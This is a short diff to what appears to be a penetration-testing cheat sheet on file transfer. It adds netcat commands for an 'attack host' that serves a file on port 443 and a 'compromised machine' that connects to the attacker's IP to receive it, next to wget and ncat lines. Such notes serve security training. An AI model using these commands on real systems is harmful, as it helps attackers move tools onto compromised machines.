@@ -36,4 +36,12 @@ wget -q <URL TO FILE> #GET URL CONTENTS FIRST
 ncat --send-only <TARGET IP> <PORT> < <FILE>
 ```
 
-#### Attack Host
+#### Attack Host - Sending File as Input to Netcat
+```bash
+sudo nc -l -p 443 -q 0 < <FILE>
+```
+
+#### Compromised machine connects to receive file
+```bash
+nc <IP OF ATTACKER> <PORT> 
+```
